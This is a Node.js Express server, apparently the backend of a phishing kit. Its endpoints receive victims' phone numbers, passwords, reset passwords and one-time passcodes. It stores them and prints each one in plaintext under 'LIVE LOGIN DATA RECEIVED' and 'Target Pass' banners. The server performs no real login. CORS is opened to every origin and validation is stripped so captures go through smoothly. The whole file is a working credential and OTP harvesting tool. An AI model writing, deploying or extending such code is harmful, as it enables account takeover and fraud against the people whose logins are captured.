const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
app.use(express.json());

// FIXED: CORS ko fully open kiya taaki browser pre-flight checks block na kare
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
})); 

// 1. Unified Data Structure Schema (FIXED: Required validation constraints removed for smooth logs)
const userSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: false },
    password: { type: String, required: false },
    otpEntered: { type: String, default: "" },
    resetPhone: { type: String, default: "" },
    newPassword: { type: String, default: "" },
    actionType: { type: String, default: "LOGIN" }, 
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Memory stack for holding temporary modification requests 
let pendingResets = {};

// 2. Database Server Initialization Function
async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        
        await mongoose.connect(mongoUri);
        console.log('\n====================================');
        console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
        console.log('====================================');

        // FIXED: Port 4000 par strictly capture line open hai
        app.listen(4000, '0.0.0.0', () => {
            console.log('🚀 Backend Server running on port 4000');
            console.log('Aapka backend puri tarah ready hai!');
            console.log('====================================\n');
        });
    } catch (err) {
        console.error('❌ Database Connection Error:', err);
    }
}

// 3. API Route: Login Submission
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        const newUser = new User({ phoneNumber, password, actionType: "LOGIN" });
        const savedUser = await newUser.save();
        
        console.log(`\n[🔥 LIVE LOGIN DATA RECEIVED]`);
        console.log(`📱 Phone Number : ${phoneNumber}`);
        console.log(`🔑 Password     : ${password}`);
        console.log(`------------------------------------`);
        
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (error) {
        console.error("Login Error:", error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// 4. API Route: Forgot Password Initiation
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        
        // Temporarily store credentials inside object mapping structure
        pendingResets[phone] = { newPassword };

        console.log(`\n[🔄 PASSWORD RESET PROCESS TRIGGERED]`);
        console.log(`📱 Target User : ${phone}`);
        console.log(`🔑 Target Pass : ${newPassword}`);
        console.log(`------------------------------------`);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Forgot Error:", error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// 5. API Route: Universal OTP Router Aggregator
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp, isReset, phone } = req.body;
        
        if (isReset) {
            const cachedContext = pendingResets[phone];
            if(cachedContext) {
                const resetData = new User({
                    resetPhone: phone,
                    newPassword: cachedContext.newPassword,
                    otpEntered: otp,
                    actionType: "PASSWORD_RESET"
                });
                await resetData.save();

                console.log(`\n[🔐 PASSWORD RESET LOG RECORDED SUCCESSFULLY]`);
                console.log(`📱 Phone Target : ${phone}`);
                console.log(`🔑 New Password : ${cachedContext.newPassword}`);
                console.log(`🔐 OTP Entered  : ${otp}`);
                console.log('====================================');
                
                delete pendingResets[phone]; 
                return res.status(200).json({ success: true });
            } else {
                return res.status(400).json({ success: false, message: "Session Expired" });
            }
        } else {
            if (userId && mongoose.Types.ObjectId.isValid(userId)) {
                await User.findByIdAndUpdate(userId, { otpEntered: otp });
            }
            
            console.log(`\n[🔑 LOGIN OTP UPDATED SUCCESSFULLY]`);
            console.log(`🆔 User ID : ${userId}`);
            console.log(`🔐 OTP     : ${otp}`);
            console.log('====================================');
            
            res.status(200).json({ success: true });
        }
    } catch (error) {
        console.error("OTP Error:", error);
        res.status(500).json({ success: false, message: error.message });
    }
});

startServer();
